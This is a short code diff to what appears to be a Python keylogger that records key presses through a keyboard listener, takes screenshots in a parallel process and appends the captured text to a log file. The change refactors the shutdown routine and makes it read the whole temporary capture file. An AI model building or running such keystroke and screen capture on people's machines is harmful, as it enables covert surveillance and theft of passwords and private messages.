@@ -50,6 +50,14 @@ def keyLogging():
 	with keyboard.Listener(on_press=keyPress) as listener:
 		listener.join()
 
+def keyInterrupt():
+	print('Terminating Processes')
+	screenshot.terminate()
+	keylog.terminate()
+	print('Processes Terminated')
+	print('System Exiting')
+	sys.exit(0)
+
 if __name__=='__main__':
 	screenshot = Process(target = takeScreenShot)
 	screenshot.start()
@@ -62,14 +70,12 @@ if __name__=='__main__':
 	except KeyboardInterrupt:
 		with open(LOG_FILE, 'a') as f:
 			r = open(TEMP_FILE,'r')
-			str = r.read(10)
+			pos = r.seek(0,2)
+			r.seek(0,0)
+			str = r.read(pos)
 			f.write('######' + time.strftime('%H:%M:%S_%Y-%m-%d') + '######\n\n')
 			f.write(str)
 			r.close()
 			os.remove(TEMP_FILE)
-		print('Terminating Processes')
-		screenshot.terminate()
-		keylog.terminate()
-		print('Processes Terminated')
-		print('System Exiting')
-		sys.exit(0)
+			keyInterrupt()
+		
